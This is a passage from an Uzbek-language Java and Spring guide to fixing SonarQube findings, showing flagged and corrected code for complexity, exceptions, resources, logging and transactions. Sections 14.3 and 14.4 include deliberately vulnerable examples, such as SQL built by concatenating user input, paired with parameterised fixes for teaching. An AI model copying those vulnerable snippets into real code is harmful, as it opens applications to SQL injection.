### 13.1 Metodni qisqa va bitta mas'uliyatli qilish: murakkablik chegarasidan oshmaslik

Sonar metod uchun ikki xil o'lchov yuritadi. Birinchisi cyclomatic complexity: shartli tarmoqlar soni. Ikkinchisi cognitive complexity (`java:S3776`): odam uchun o'qish qiyinligi, ya'ni har bir ichma-ich daraja qo'shimcha jarima oladi. Ikkinchisi muhimroq, chunki u ichma-ichlikni alohida jazolaydi: ikki daraja ichidagi `if` bir darajadagidan qimmatroq turadi. Metod qatorlari soni uchun ham alohida qoida bor (`java:S138`), lekin amalda cognitive complexity birinchi portlaydi.

```java
// Sonar shikoyat qiladigan variant: cognitive complexity chegaradan oshadi
public BigDecimal hisobla(Buyurtma b) {
    BigDecimal jami = BigDecimal.ZERO;
    if (b != null) {
        if (b.getQatorlar() != null) {
            for (Qator q : b.getQatorlar()) {
                if (q.getSoni() > 0) {
                    if (q.getChegirma() != null) {
                        if (q.getChegirma().signum() > 0) {
                            jami = jami.add(q.getNarx()
                                .multiply(BigDecimal.valueOf(q.getSoni()))
                                .subtract(q.getChegirma()));
                        } else {
                            jami = jami.add(q.getNarx());
                        }
                    } else {
                        jami = jami.add(q.getNarx());
                    }
                }
            }
        }
    }
    return jami;
}
```

Yechim murakkablikni yo'qotish emas, uni bir nechta nomli metodga taqsimlash. Har bir ajratilgan metod o'z nomi bilan nima qilayotganini aytadi va har birining murakkabligi chegaradan past bo'ladi.

```java
// O'tadigan variant: har bir metod bitta qarorni oladi
public BigDecimal hisobla(Buyurtma b) {
    return b.getQatorlar().stream()
        .filter(q -> q.getSoni() > 0)
        .map(this::qatorSummasi)
        .reduce(BigDecimal.ZERO, BigDecimal::add);
}

private BigDecimal qatorSummasi(Qator q) {
    BigDecimal xom = q.getNarx().multiply(BigDecimal.valueOf(q.getSoni()));
    return xom.subtract(chegirma(q));
}

private BigDecimal chegirma(Qator q) {
    // null va nol chegirma bir xil ishlanadi
    BigDecimal ch = q.getChegirma();
    return (ch == null || ch.signum() <= 0) ? BigDecimal.ZERO : ch;
}
```

Bu bo'linish testga ham yordam beradi. `chegirma` metodini to'g'ridan to'g'ri qoplash uchun uchta kichik test kerak, aks holda o'sha tarmoqlarni faqat katta integratsion test orqali bosib o'tish mumkin bo'ladi.

### 13.2 Parametrlar soni va ularni obyektga yig'ish

`java:S107` metod parametrlari sonini cheklaydi, standart chegara yetti (sozlanadi). Ko'p parametrning asl muammosi soni emas: bir xil tipdagi qo'shni parametrlarni chaqiruv joyida almashtirib yuborish juda oson va kompilyator buni ko'rmaydi.

```java
// Sonar shikoyat qiladigan variant: tartibni adashtirish oson
public Tolov yarat(String mijozId, String karta, String valyuta,
                  BigDecimal summa, BigDecimal komissiya,
                  String izoh, boolean takrorlash, String idempotencyKey) {
    // ...
}
```

Parametrlarni ma'nosi bo'yicha bitta immutable record ichiga yig'ish kerak. Shunda nomlar chaqiruv joyida ko'rinadi va validatsiya bir joyga to'planadi.

```java
// O'tadigan variant: nomlangan maydonlar, markazlashgan validatsiya
public record TolovSorovi(
        String mijozId, String karta, String valyuta,
        BigDecimal summa, BigDecimal komissiya,
        String izoh, boolean takrorlash, String idempotencyKey) {

    public TolovSorovi {
        // konstruktor ichida shartni bir marta tekshiramiz
        Objects.requireNonNull(mijozId, "mijozId bo'sh bo'lmasligi kerak");
        if (summa == null || summa.signum() <= 0) {
            throw new IllegalArgumentException("summa musbat bo'lishi kerak");
        }
    }
}

public Tolov yarat(TolovSorovi sorov) { /* ... */ }
```

### 13.3 Ichma-ich shartlarni erta qaytish bilan yassilash

Ichma-ichlik cognitive complexity ga eng ko'p hissa qo'shadi. Bundan tashqari bitta `if` ichida yana bitta `if` turgan holat alohida qoida bilan belgilanadi (`java:S1066`): ularni `&&` bilan birlashtirish yoki erta qaytish bilan yassilash kerak.

```java
// Sonar shikoyat qiladigan variant: uch daraja ichma-ichlik
public void jonat(Buyurtma b) {
    if (b.getHolat() == Holat.TOLANGAN) {
        if (b.getManzil() != null) {
            if (omborda(b)) {
                kuryerga.ber(b);
            }
        }
    }
}
```

Erta qaytish har bir shartni alohida gapga aylantiradi va asosiy yo'l metodning oxirida yolg'iz qoladi.

```java
// O'tadigan variant: guard clause, yassi struktura
public void jonat(Buyurtma b) {
    if (b.getHolat() != Holat.TOLANGAN) {
        return;
    }
    if (b.getManzil() == null) {
        throw new ManzilYoqException(b.getId());
    }
    if (!omborda(b)) {
        kutishGaQoy(b);
        return;
    }
    kuryerga.ber(b);
}
```

Bu yerda bitta tuzoq bor. Qaytish nuqtalari juda ko'payib ketsa, alohida qoida ishga tushadi (`java:S1142`, standart chegara uchta `return`). Demak erta qaytishni shartni soddalashtirish uchun ishlating, metodga o'nta chiqish eshigi yasash uchun emas. Agar chiqish nuqtalari ko'paysa, bu metodni bo'lish vaqti kelgani belgisi.

### 13.4 `null` ni qaytarmaslik va `Optional` ni to'g'ri ishlatish

Sonar `null` bilan ikki tomondan ishlaydi. Birinchisi bug sifatidagi tekshiruv: analizator oqimni kuzatib, `null` bo'lishi mumkin bo'lgan qiymat dereference qilinganini topadi (`java:S2259`). Ikkinchisi dizayn qoidalari: massiv yoki kolleksiya o'rniga `null` qaytarish (`java:S1168`), `Optional` ning o'zini `null` qilib qo'yish (`java:S2789`) va `isPresent()` tekshirmasdan `get()` chaqirish (`java:S3655`).

```java
// Sonar shikoyat qiladigan variant: null kolleksiya va tekshirilmagan get()
public List<Tolov> tolovlar(String mijozId) {
    Mijoz m = repo.find(mijozId);
    if (m == null) {
        return null; // chaqiruvchi NPE oladi
    }
    return m.getTolovlar();
}

public String kartaRaqami(String mijozId) {
    Optional<Mijoz> m = repo.findById(mijozId);
    return m.get().getKarta(); // isPresent() yo'q
}
```

To'g'ri variantda yo'qlik ikki xil tilda ifodalanadi: kolleksiya uchun bo'sh kolleksiya, bitta obyekt uchun `Optional`.

```java
// O'tadigan variant
public List<Tolov> tolovlar(String mijozId) {
    return repo.findById(mijozId)
        .map(Mijoz::getTolovlar)
        .orElseGet(List::of); // hech qachon null emas
}

public String kartaRaqami(String mijozId) {
    return repo.findById(mijozId)
        .map(Mijoz::getKarta)
        .orElseThrow(() -> new MijozYoqException(mijozId));
}
```

`Optional` ni maydon yoki metod parametri sifatida ishlatmaslik kerak. U faqat qaytish tipi uchun mo'ljallangan va boshqa joyda ishlatilsa Sonar ham, review ham shikoyat qiladi.

### 13.5 Istisnolarni to'g'ri ushlash: umumiy `Exception` ni ushlamaslik, yutib yubormaslik

Bu yerda bir nechta qoida birgalikda ishlaydi. Keng `Exception` yoki `RuntimeException` ni kerak bo'lmaganda ushlash (`java:S2221`), `Throwable` yoki `Error` ni ushlash (`java:S1181`), umumiy istisnoni o'zi tashlash (`java:S112`), bo'sh `catch` bloki (`java:S108`), `printStackTrace()` chaqirish (`java:S1148`) va `InterruptedException` ni qayta tiklamaslik (`java:S2142`).

```java
// Sonar shikoyat qiladigan variant: sabab yo'qoladi, xato yashiriladi
public void tolovniYubor(TolovSorovi s) {
    try {
        gateway.charge(s);
    } catch (Exception e) {
        e.printStackTrace(); // log emas, stdout
    }
}
```

Bu kodning eng yomon tomoni Sonar emas, ishlab chiqarish: to'lov muvaffaqiyatsiz bo'lsa ham chaqiruvchi hech narsa bilmaydi. To'g'ri variant aniq tiplarni ushlaydi, sababni saqlaydi va domen istisnosiga o'raydi.

```java
// O'tadigan variant: aniq tip, sabab saqlangan, interrupt tiklangan
public void tolovniYubor(TolovSorovi s) {
    try {
        gateway.charge(s);
    } catch (GatewayTimeoutException e) {
        // sabab (cause) uzatiladi, stack trace yo'qolmaydi
        throw new TolovVaqtinchaMumkinEmasException(s.idempotencyKey(), e);
    } catch (InterruptedException e) {
        Thread.currentThread().interrupt(); // flagni tiklaymiz
        throw new TolovBekorQilindiException(s.idempotencyKey(), e);
    }
}
```

Agar istisnoni chindan ham e'tiborsiz qoldirish kerak bo'lsa, buni ochiq yozish kerak: `catch` ichida izoh va kamida `log.debug` bo'lsin. Bo'sh blok bilan jim qolish review da ham, Sonar da ham eng qimmat odat.

| Tuzoq | Sonar nima deydi | Yechim |
| --- | --- | --- |
| `catch (Exception e)` hamma joyda | keng istisnoni ushlash shikoyati | aniq tiplarni alohida ushlash |
| `catch` bloki bo'sh | bo'sh blok qoidasi | log yozish yoki qayta tashlash |
| `throw new RuntimeException(msg)` | umumiy istisno tashlash | domen istisnosi yaratish |
| `new XException(e.getMessage())` | shikoyat bo'lmasligi mumkin, lekin cause yo'qoladi | `cause` ni konstruktorga uzatish |
| `InterruptedException` yutilgan | interrupt holati tiklanmagan | `Thread.currentThread().interrupt()` |
| `e.printStackTrace()` | stdout ga yozish shikoyati | logger orqali yozish |
| `finally` ichida `return` | boshqarish oqimi buzilishi | `finally` da faqat tozalash |
| oqim `close()` qilinmagan | resurs yopilmagan shikoyati | `try-with-resources` |

### 13.6 Resurslarni yopish: `try-with-resources` va yopilmagan oqim

`java:S2095` metoddan chiqishdan oldin yopilmagan `Closeable` ni topadi. Qiyin tomoni shundaki, qo'lda yozilgan `finally` ko'pincha to'liq emas: resurs yaratilishi bilan istisno orasida bo'shliq qoladi yoki ikkita resursdan ikkinchisi yopilmaydi.

```java
// Sonar shikoyat qiladigan variant: istisno bo'lsa resurs ochiq qoladi
public int hisobotYoz(String yol, List<Qator> qatorlar) throws IOException {
    BufferedWriter w = new BufferedWriter(new FileWriter(yol));
    for (Qator q : qatorlar) {
        w.write(q.toCsv());  // bu yerda istisno bo'lsa close() chaqirilmaydi
        w.newLine();
    }
    w.close();
    return qatorlar.size();
}
```

```java
// O'tadigan variant: try-with-resources, bir nechta resurs ham xavfsiz
public int hisobotYoz(Path yol, List<Qator> qatorlar) throws IOException {
    try (BufferedWriter w = Files.newBufferedWriter(yol)) {
        for (Qator q : qatorlar) {
            w.write(q.toCsv());
            w.newLine();
        }
    } // close() har qanday holatda chaqiriladi
    return qatorlar.size();
}

// Stream ham resurs: Files.lines() ni ham yopish kerak
public long qatorSoni(Path yol) throws IOException {
    try (Stream<String> satrlar = Files.lines(yol)) {
        return satrlar.filter(s -> !s.isBlank()).count();
    }
}
```

Spring kontekstida `JdbcTemplate`, `RestClient` va `EntityManager` ni o'zingiz yopmaysiz, ularni framework boshqaradi. Lekin `Files.lines`, `Stream` qaytaradigan JPA so'rovlari va qo'lda ochilgan `Connection` sizning mas'uliyatingizda qoladi.

### 13.7 O'zgaruvchan holatni cheklash: `final`, immutable obyekt

Sonar bu yerda bir nechta tomondan yondashadi: `public` o'zgaruvchan maydon (`java:S1104`), o'qilmagan qiymat tayinlash (dead store, `java:S1854`), parametrni metod ichida qayta tayinlash va kolleksiyani to'g'ridan to'g'ri tashqariga qaytarish. Asosiy g'oya bitta: obyekt yaratilgandan keyin o'zgarmasa, uning hech qanday tarmog'ini tekshirish kerak emas.

```java
// Sonar shikoyat qiladigan variant: tashqaridan buzish mumkin
public class OmborQoldigi {
    public Map<String, Integer> qoldiq = new HashMap<>(); // ochiq maydon
    public List<String> ogohlantirishlar;

    public void yukla(Map<String, Integer> manba) {
        this.qoldiq = manba;        // tashqi map ga ishonamiz
        manba = new HashMap<>();    // parametrni qayta tayinlash, foydasiz
    }
}
```

```java
// O'tadigan variant: immutable holat, nusxa olish
public final class OmborQoldigi {
    private final Map<String, Integer> qoldiq;

    public OmborQoldigi(Map<String, Integer> manba) {
        // mudofaa nusxasi: tashqi o'zgarish bizga ta'sir qilmaydi
        this.qoldiq = Map.copyOf(manba);
    }

    public int soni(String sku) {
        return qoldiq.getOrDefault(sku, 0);
    }

    public Map<String, Integer> barchasi() {
        return qoldiq; // allaqachon o'zgarmas
    }
}
```

Immutable obyektning Sonar uchun yana bir foydasi bor: concurrency qoidalari (`synchronized` yetishmasligi, ikki marta tekshirilgan lock) umuman ishga tushmaydi, chunki o'zgaradigan holat yo'q.

### 13.8 Takrorlanuvchi literal va magic number ni konstantaga chiqarish

`java:S1192` bir xil string literal bir faylda uch marta (standart sozlama) uchrasa shikoyat qiladi. `java:S109` esa izohsiz raqamlarni topadi. Ikkalasining asl zarari bir xil: qiymat o'zgarganda uni hamma joyda topish kerak bo'ladi va bitta joy esdan chiqadi.

```java
// Sonar shikoyat qiladigan variant: takrorlanuvchi literal va magic number
public void tekshir(Tolov t) {
    if (t.getValyuta().equals("UZS") && t.getSumma().compareTo(
            BigDecimal.valueOf(50000000)) > 0) {
        audit.yoz("LIMIT_OSHDI", t.getId());
    }
    if (t.getValyuta().equals("UZS") && t.getUrinish() > 3) {
        audit.yoz("LIMIT_OSHDI", t.getId());
    }
}
```

```java
// O'tadigan variant: nomlangan konstantalar ma'noni ham tushuntiradi
private static final String VALYUTA_UZS = "UZS";
private static final String AUDIT_LIMIT = "LIMIT_OSHDI";
private static final BigDecimal KUNLIK_LIMIT = new BigDecimal("50000000");
private static final int MAX_URINISH = 3;

public void tekshir(Tolov t) {
    if (!VALYUTA_UZS.equals(t.getValyuta())) {
        return;
    }
    if (t.getSumma().compareTo(KUNLIK_LIMIT) > 0 || t.getUrinish() > MAX_URINISH) {
        audit.yoz(AUDIT_LIMIT, t.getId());
    }
}
```

Agar qiymat muhitga qarab o'zgarsa, konstanta emas, konfiguratsiya kerak: `@ConfigurationProperties` yoki `application.yaml`. Konstantaga chiqarish faqat kod uchun haqiqatan o'zgarmas qiymatlarga tegishli.

### 13.9 To'g'ri taqqoslash: `equals`, `compareTo`, suzuvchi nuqta, `BigDecimal`

Taqqoslash qoidalari Sonar da bug kategoriyasida turadi, ya'ni ular quality gate ning yangi kod shartini eng tez buzadigan guruh. Eng ko'p uchraydiganlari: obyektlarni `==` bilan solishtirish (`java:S4973`), suzuvchi nuqta sonlarini tenglikka tekshirish (`java:S1244`), `equals` ni `hashCode` siz override qilish (`java:S1206`).

```java
// Sonar shikoyat qiladigan variant
boolean bir = statusKod == "OK";                 // String ni == bilan
boolean ikki = jami == 0.1 + 0.2;                // double tenglik, hech qachon rost emas
BigDecimal a = new BigDecimal("1.0");
BigDecimal b = new BigDecimal("1.00");
boolean uch = a.equals(b);                       // false: scale farq qiladi
BigDecimal narx = new BigDecimal(0.1);           // ikkilik xato kiradi
```

```java
// O'tadigan variant
boolean bir = "OK".equals(statusKod);            // NPE ham bo'lmaydi
boolean ikki = Math.abs(jami - 0.3) < 1e-9;      // epsilon bilan
boolean uch = a.compareTo(b) == 0;               // qiymat bo'yicha teng
BigDecimal narx = new BigDecimal("0.1");         // String konstruktor
// pul uchun doim BigDecimal va aniq scale
BigDecimal yakun = narx.multiply(BigDecimal.valueOf(3))
        .setScale(2, RoundingMode.HALF_UP);
```

Pul bilan ishlaganda `double` ni butunlay chiqarib tashlash kerak. Bu bitta Sonar qoidasi emas, ammo u bir vaqtning o'zida `java:S1244` ni, yumaloqlash bug'larini va hisobot farqlarini yo'q qiladi.

### 13.10 Loglash qoidalari: formatlangan xabar, istisno uzatish, maxfiy ma'lumot

`java:S2629` log chaqiruvida argument oldindan hisoblanishini topadi: string konkatenatsiya log darajasi o'chirilgan bo'lsa ham bajariladi. Bundan tashqari maxfiy ma'lumotni logga yozish security kategoriyasiga tushadi va foydalanuvchi kiritgan matnni to'g'ridan to'g'ri logga qo'yish log injection sifatida belgilanishi mumkin.

```java
// Sonar shikoyat qiladigan variant
log.debug("Tolov: " + sorov.toString() + " karta=" + sorov.karta());
try {
    gateway.charge(sorov);
} catch (GatewayException e) {
    log.error("xato: " + e.getMessage()); // stack trace yo'q
}
```

```java
// O'tadigan variant: placeholder, maskalangan ma'lumot, istisno obyekti
log.debug("Tolov qabul qilindi id={} karta={}", sorov.idempotencyKey(),
        maskala(sorov.karta()));
try {
    gateway.charge(sorov);
} catch (GatewayException e) {
    // istisnoni oxirgi argument sifatida uzatamiz: stack trace saqlanadi
    log.error("Gateway xatosi id={}", sorov.idempotencyKey(), e);
    throw new TolovXatosiException(sorov.idempotencyKey(), e);
}

private static String maskala(String karta) {
    return karta == null ? "null" : "****" + karta.substring(karta.length() - 4);
}
```

Yana bir muhim nuqta: `log.error` va keyin istisnoni qayta tashlash ikkita log yozuvi beradi. Qoidani bitta qilib qo'yish kerak: yoki shu joyda log yoziladi va istisno yutiladi (kamdan kam), yoki istisno tashlanadi va log eng yuqori qatlamda bir marta yoziladi.

### 13.11 Kodni Sonar nuqtai nazaridan o'qib chiqish odati

Eng samarali usul analizator natijasini kutmaslik. Pull request yuborishdan oldin o'z diff ingizni o'nta savol bilan o'qib chiqish Sonar topadigan shikoyatlarning katta qismini oldindan yo'q qiladi: metodda nechta ichma-ich daraja bor, qaysi resurs yopilmagan, qaysi `catch` jim, qaysi literal uchinchi marta takrorlanmoqda, qaysi `equals` yetishmaydi. IDE da SonarLint o'rnatilgan bo'lsa bu tekshiruv yozish paytida bo'ladi va server tahliliga faqat qoida farqlari qoladi.

| Vaziyat | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Shikoyat paydo bo'ldi | tezda `//NOSONAR` qo'yiladi | sababi tuziladi, suppress faqat asoslangan holda |
| Murakkab metod | chegara sozlamasi oshiriladi | metod nomli bo'laklarga ajratiladi |
| Ko'p parametr | yangi overload qo'shiladi | parametrlar record ga yig'iladi |
| `null` qaytish | chaqiruvchida `if (x != null)` | `Optional` yoki bo'sh kolleksiya shartnomaga kiritiladi |
| Keng `catch` | `catch (Exception e)` qoldiriladi | aniq tip, cause uzatish, domen istisnosi |
| Resurs yopish | qo'lda `finally` yoziladi | `try-with-resources` majburiy qilinadi |
| Takrorlangan literal | nusxa ko'chirilib ketadi | konstanta yoki konfiguratsiya ajratiladi |
| Pul hisobi | `double` bilan ishlanadi | `BigDecimal` va aniq `RoundingMode` |
| Log yozish | string konkatenatsiya | placeholder va maskalash standarti |
| Qoida o'zgarishi | har kim o'zicha tuzatadi | quality profile versiyalanadi va jamoada kelishiladi |

Oxirgi qatorga alohida e'tibor bering. Bu bobdagi hamma narsa quality profile da yoqilgan qoidalarga bog'liq, chegaralar esa sozlanadi. Shuning uchun "bu kod Sonar dan o'tadi" degan gap faqat ma'lum profil va ma'lum chegaralar uchun to'g'ri bo'ladi. Jamoada profilni yozib qo'yish va uni o'zgartirishni ongli qaror qilib belgilash kodni tuzatishdan ko'ra ko'proq foyda beradi.

### 13.12 Amalda qo'llash

- [ ] O'z modulingizda cognitive complexity bo'yicha eng yuqori beshta metodni toping va ularni erta qaytish bilan yassilab, nomli private metodlarga ajratib chiqing.
- [ ] Beshdan ko'p parametrli public metodlarni sanab chiqing va ularning kamida bittasini immutable `record` parametrga o'tkazing, validatsiyani konstruktorga yig'ing.
- [ ] Loyihadagi `return null` holatlarini qidirib, kolleksiya qaytaradiganlarini bo'sh kolleksiyaga, bitta obyekt qaytaradiganlarini `Optional` ga o'zgartiring.
- [ ] Barcha `catch (Exception` va `catch (Throwable` joylarini ko'rib chiqing: aniq tipga toraytiring, `cause` ni uzating, bo'sh bloklarni yo'q qiling.
- [ ] `Closeable` va `Stream` qaytaradigan chaqiruvlarni tekshirib, qo'lda yozilgan `finally` bloklarini `try-with-resources` ga ko'chiring.
- [ ] Pul bilan ishlaydigan hamma joyda `double` va `float` ni `BigDecimal` ga o'tkazing, `equals` o'rniga `compareTo` ishlating va `setScale` ni aniq belgilang.
- [ ] Log chaqiruvlarini placeholder formatiga keltiring, istisnoni oxirgi argument sifatida uzating va karta, token, parol kabi maydonlar uchun maskalash yordamchisi yozing.
- [ ] IDE ga SonarLint o'rnatib, uni serverdagi quality profile ga ulang, so'ngra pull request oldidan diff ni shu bobdagi savollar ro'yxati bilan o'qib chiqish odatini jamoa qoidasiga kiriting.

## 14. Java va Spring da eng ko'p uchraydigan issue va ularning yechimi (Common Java and Spring Issues)

Har bir Java loyihada Sonar topadigan issue larning aksariyati o'n chog'li naqshdan iborat. Ular yangi emas va qiyin ham emas, lekin takrorlanadi, chunki ularni kod yozish paytida ko'rmaslik oson. Quyida har bir naqsh uchun Sonar nimani o'lchaydi, nega shikoyat qiladi va qanday kod bilan u shikoyat qilmaydi ko'rsatilgan. Qoida kalitlari faqat ishonch komil bo'lgan joyda yozilgan, qolgan joyda qoidaning mazmuni tasvirlangan.

### 14.1 Maydon orqali bog'liqlik kiritish (`@Autowired` field injection) va konstruktor bilan almashtirish

Sonar `@Autowired` qo'yilgan maydonni maintainability issue sifatida belgilaydi. Spring uchun mos qoida kaliti `java:S6813`. Sababi texnik: maydon reflection orqali to'ldiriladi, demak obyekt konstruktor tugaganda hali to'liq emas. Shuning uchun maydon `final` bo'la olmaydi va klassni Spring context dan tashqarida test qilish uchun reflection yoki `@InjectMocks` kerak bo'ladi. Konstruktor injection da bog'liqlik majburiy bo'ladi va kompilyator uni tekshiradi. Yana bir foyda: konstruktor parametrlari soni o'sib ketsa, klass juda ko'p ish qilayotgani ko'rinadi. Bitta konstruktor bo'lsa Spring 4.3 dan beri `@Autowired` yozish shart emas.

```java
// Yomon: Sonar maydon orqali injection ni belgilaydi, maydon final bo'lmaydi
@Service
public class PaymentService {
    @Autowired private PaymentGateway gateway;
    @Autowired private OrderRepository orders;
    @Autowired private AuditLogger audit;
}

// Yaxshi: final maydon, bitta konstruktor, @Autowired shart emas
@Service
public class PaymentService {
    private final PaymentGateway gateway;
    private final OrderRepository orders;
    private final AuditLogger audit;

    public PaymentService(PaymentGateway gateway,
                          OrderRepository orders,
                          AuditLogger audit) {
        this.gateway = gateway;
        this.orders = orders;
        this.audit = audit;
    }
}
```

### 14.2 Katta controller metodi va uni servisga bo'lish

Controller ichida validatsiya, biznes qoida, baza bilan ishlash va javob yig'ish bir joyda bo'lsa, Sonar bir vaqtda bir necha qoidani ishga tushiradi. Eng muhimi cognitive complexity, kaliti `java:S3776`, standart chegara metod uchun 15. Yana `java:S138` metod qatorlari soni uchun va `java:S107` parametrlar soni uchun ishlaydi. Cognitive complexity har bir `if`, `for`, `catch` va ichki joylashuv uchun ball qo'shadi, shuning uchun ichma-ich shartlar jarimani tez oshiradi. Yechim kodni qisqartirish emas, balki mas'uliyatni ko'chirish. Controller HTTP ni biznesga tarjima qiladi va boshqa hech narsa qilmaydi. Shunda coverage ham osonlashadi: biznes qoidani servis testida yopasiz, controller uchun `@WebMvcTest` yetadi.

```java
// Yomon: controller ichida hamma narsa, cognitive complexity chegaradan oshadi
@PostMapping("/orders")
public ResponseEntity<?> create(@RequestBody Map<String, Object> body) {
    if (body.get("items") == null) return ResponseEntity.badRequest().build();
    List<?> items = (List<?>) body.get("items");
    if (items.isEmpty()) return ResponseEntity.badRequest().build();
    BigDecimal total = BigDecimal.ZERO;
    for (Object raw : items) {
        Map<?, ?> item = (Map<?, ?>) raw;
        Integer qty = (Integer) item.get("qty");
        if (qty == null || qty <= 0) return ResponseEntity.badRequest().build();
        Stock stock = stockRepo.findBySku((String) item.get("sku"));
        if (stock == null || stock.getQty() < qty) {
            return ResponseEntity.status(409).build();
        }
        total = total.add(stock.getPrice().multiply(BigDecimal.valueOf(qty)));
    }
    return ResponseEntity.ok(orderRepo.save(new Order(total)));
}

// Yaxshi: controller faqat tarjima qiladi
@PostMapping("/orders")
public ResponseEntity<OrderResponse> create(@Valid @RequestBody CreateOrderRequest req) {
    OrderResponse created = orderService.place(req);   // biznes qoida servisda
    return ResponseEntity.status(HttpStatus.CREATED).body(created);
}
```

### 14.3 Tekshirilmagan foydalanuvchi kiritmasi va validatsiya

Sonar tashqaridan kelgan ma'lumotni "tainted" deb kuzatadi va u xavfli joyga (SQL, fayl yo'li, komanda, HTML) tekshirilmagan holda yetib borsa vulnerability ochadi. Shu sababli validatsiyani chegarada bajarish Sonar uchun ham tushunarli bo'ladi. Tipli DTO ishlatsangiz, Bean Validation annotatsiyalari qoidani hujjatlashtiradi. `@Valid` yozilmagan `@RequestBody` keng tarqalgan xato: annotatsiyalar bor, lekin hech qachon ishlamaydi. Enum yoki whitelist orqali qabul qilish esa taint zanjirini butunlay uzadi, chunki qiymat endi foydalanuvchidan emas, sizning ro'yxatingizdan keladi.

```java
// Yomon: tekshiruv yo'q, sort maydoni to'g'ridan-to'g'ri so'rovga ketadi
@GetMapping("/reports")
public List<Report> list(@RequestParam String sort, @RequestParam String from) {
    return reportRepo.findAllSorted(sort, LocalDate.parse(from));
}

// Yaxshi: tipli DTO, Bean Validation va whitelist enum
public record ReportQuery(
        @NotNull SortField sort,
        @NotNull @PastOrPresent LocalDate from,
        @Min(1) @Max(200) int size) { }

public enum SortField {
    CREATED_AT("created_at"), TOTAL("total");           // ruxsat etilgan ustunlar
    private final String column;
    SortField(String column) { this.column = column; }
    public String column() { return column; }
}

@GetMapping("/reports")
public List<Report> list(@Valid ReportQuery query) {     // @Valid bo'lmasa tekshiruv ishlamaydi
    return reportService.find(query);
}
```

### 14.4 Qo'lda yozilgan SQL konkatenatsiyasi va parametrlangan so'rov

SQL ni satr qo'shish bilan yig'ish Sonar da ikki xil belgilanadi. Formatlangan so'rov security hotspot sifatida chiqadi, kaliti `java:S2077`. Agar taint tahlili foydalanuvchi qiymatining so'rovga yetib borishini isbotlasa, bu vulnerability darajasiga ko'tariladi. Yechim oddiy: qiymatlar har doim parametr orqali uzatiladi. Muhim nuqta: parametr faqat qiymat uchun ishlaydi, ustun nomi uchun ishlamaydi. Shuning uchun tartiblash ustunini enum orqali whitelist qilish kerak.

```java
// Yomon: konkatenatsiya, Sonar security hotspot yoki vulnerability ochadi
public List<Order> search(String customer, String sort) {
    String sql = "SELECT * FROM orders WHERE customer_name = '" + customer
               + "' ORDER BY " + sort;
    return jdbc.query(sql, new OrderRowMapper());
}

// Yaxshi: qiymat parametr orqali, ustun nomi whitelist orqali
private static final String BASE =
        "SELECT * FROM orders WHERE customer_name = :customer ORDER BY ";

public List<Order> search(String customer, SortField sort) {
    String sql = BASE + sort.column();                  // enum, foydalanuvchi satri emas
    return jdbc.query(sql, Map.of("customer", customer), new OrderRowMapper());
}

// Yoki butunlay Spring Data orqali, SQL qo'lda yozilmaydi
public interface OrderRepository extends JpaRepository<Order, Long> {
    List<Order> findByCustomerName(String customerName, Sort sort);
}
```

### 14.5 `@Transactional` ni noto'g'ri joyga qo'yish bilan bog'liq ogohlantirishlar

`@Transactional` proxy orqali ishlaydi, shuning uchun u faqat tashqaridan kelgan chaqiruvda kuchga kiradi. Sonar shu sababli bir necha ogohlantirish beradi. Bir xil klass ichidagi `this` orqali chaqiruvda annotatsiya butunlay e'tiborsiz qoladi va bu eng og'riqli xato. `private` yoki `final` metodga qo'yilgan annotatsiya ham ishlamaydi, chunki proxy uni override qila olmaydi. Sonar yana bir klass ichida mos kelmaydigan `@Transactional` sozlamalari bilan chaqiruvni belgilaydi, bu qoidaning kaliti `java:S2229`. Amaliy qoida: tranzaksiya chegarasi servisning ommaviy metodi bo'ladi. Controller ga `@Transactional` qo'yish HTTP javob yozilishini tranzaksiya ichiga tortadi.

```java
// Yomon: self-invocation, annotatsiya ishlamaydi; private metodda ham ishlamaydi
@Service
public class StockService {
    public void reserveAll(List<Line> lines) {
        for (Line line : lines) reserve(line);   // this orqali, proxy chetlab o'tiladi
    }

    @Transactional
    private void reserve(Line line) {            // private, proxy override qilmaydi
        stockRepo.decrease(line.sku(), line.qty());
    }
}

// Yaxshi: tranzaksiya chegarasi ommaviy servis metodida, bitta aniq joyda
@Service
public class StockService {
    @Transactional
    public void reserveAll(List<Line> lines) {   // tashqaridan chaqiriladi, proxy ishlaydi
        for (Line line : lines) {
            stockRepo.decrease(line.sku(), line.qty());
        }
    }

    @Transactional(readOnly = true)              // o'qish uchun alohida chegara
    public StockView view(String sku) {
        return stockRepo.findView(sku);
    }
}
```

### 14.6 Sana va vaqt bilan ishlash: eskirgan API va `java.time`

`java.util.Date`, `Calendar` va `SimpleDateFormat` bilan ishlagan kodda Sonar bir necha issue ochadi. Eskirgan konstruktorlar va metodlar uchun `java:S1874` ishlaydi. `SimpleDateFormat` ni `static` maydon sifatida saqlash esa thread safety muammosi, chunki u mutable va bir vaqtda ikki thread dan ishlatilsa noto'g'ri natija beradi. `java.time` paketi bu ikki muammoni ham yopadi: tiplar immutable va `DateTimeFormatter` thread safe. Yana bir jihat: `LocalDateTime` vaqt mintaqasini saqlamaydi, shuning uchun to'lov va audit vaqti uchun `Instant` tanlang.

```java
// Yomon: eskirgan API, thread safe bo'lmagan static formatter
public class InvoiceDates {
    private static final SimpleDateFormat FMT = new SimpleDateFormat("yyyy-MM-dd");

    public Date dueDate(Date issued) {
        Calendar c = Calendar.getInstance();
        c.setTime(issued);
        c.add(Calendar.DAY_OF_MONTH, 30);   // mutable obyektni o'zgartiradi
        return c.getTime();
    }
}

// Yaxshi: java.time, immutable tiplar, thread safe formatter
public final class InvoiceDates {
    private static final DateTimeFormatter FMT = DateTimeFormatter.ISO_LOCAL_DATE;
    private final Clock clock;                // test uchun vaqtni almashtirish mumkin

    public InvoiceDates(Clock clock) { this.clock = clock; }

    public LocalDate dueDate(LocalDate issued) {
        return issued.plusDays(30);           // yangi obyekt qaytaradi
    }

    public Instant paidAt() { return clock.instant(); }
}
```

### 14.7 To'plamlarni qaytarish: modifikatsiya qilinadigan ichki to'plamni chiqarib yuborish

Ichki `List` yoki `Map` ni to'g'ridan-to'g'ri qaytarish Sonar da aniq qoida bilan belgilanadi, kaliti `java:S2384`. Chaqiruvchi qaytgan havola orqali obyektning ichki holatini o'zgartira oladi, demak klass o'z invariantini himoya qilmaydi. Buyurtma qatorlari uchun bu real xato: tashqi kod `add` chaqirsa, summa qayta hisoblanmaydi. `null` qaytarish ham alohida issue, kaliti `java:S1168`, chunki har bir chaqiruvchini tekshirishga majbur qiladi. To'g'ri javob: bo'sh to'plam qaytarish va faqat o'qiladigan ko'rinish berish. Konstruktorda kelgan to'plamni ham ko'chirib olish kerak.

```java
